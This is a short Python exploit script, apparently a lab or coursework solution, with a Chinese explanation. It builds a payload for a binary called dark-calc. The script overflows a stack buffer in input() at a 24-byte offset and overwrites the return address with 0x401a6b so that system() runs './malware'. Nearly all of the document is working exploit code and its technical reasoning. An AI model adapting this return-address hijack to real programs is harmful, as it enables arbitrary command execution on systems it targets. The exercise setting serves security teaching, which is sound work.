#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

利用 input() 的栈缓冲区溢出篡改其返回地址，使程序通过 system() 执行
同目录下的 ./malware，从而“引爆炸弹”。

栈帧布局（dark-calc 使用固定栈，地址确定）：
  expression 缓冲区位于 rbp-0x10，saved rbp 位于 rbp，返回地址位于 rbp+8，
  因此从缓冲区首到返回地址的偏移为 0x10 + 8 = 24 字节。

思路：
  1. 缓冲区开头放入 "./malware\\x00"。input() 在返回前执行
     strcpy(command_buf, expression)，strcpy 遇到 \\x00 停止，于是全局
     command_buf (0x6030d0) 恰好等于 "./malware"。
  2. 把返回地址覆盖为 0x401a6b。该地址是 eval() 内 `mov $0x6030d0,%edi;
     call system` 这两条指令，绕过了为表达式添加 "echo $((" / "))" 包裹
     的代码，于是直接执行 system("./malware")。
"""
import struct
import sys

RET_OFFSET = 24                 # 缓冲区首 -> 返回地址
SYSTEM_CALL = 0x401a6b          # mov $0x6030d0,%edi ; call system

payload = b"./malware\x00"                       # -> command_buf = "./malware"
payload += b"A" * (RET_OFFSET - len(payload))    # 填充到返回地址偏移
payload += struct.pack("<Q", SYSTEM_CALL)        # 覆盖 input 的返回地址

sys.stdout.buffer.write(payload)
